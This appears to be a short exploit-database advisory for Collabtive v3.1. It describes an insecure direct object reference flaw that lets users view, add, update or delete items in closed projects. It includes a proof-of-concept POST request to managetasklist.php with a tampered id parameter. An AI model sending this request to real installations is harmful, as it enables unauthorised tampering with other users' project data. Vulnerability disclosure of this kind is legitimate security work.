# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view/add/update/delete/ every item in the project that is closed(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /managetasklist.php?action=add&id=3(CHANGE HERE) HTTP/1.1
...

name=aaa&desc=aaaaa&milestone=0
```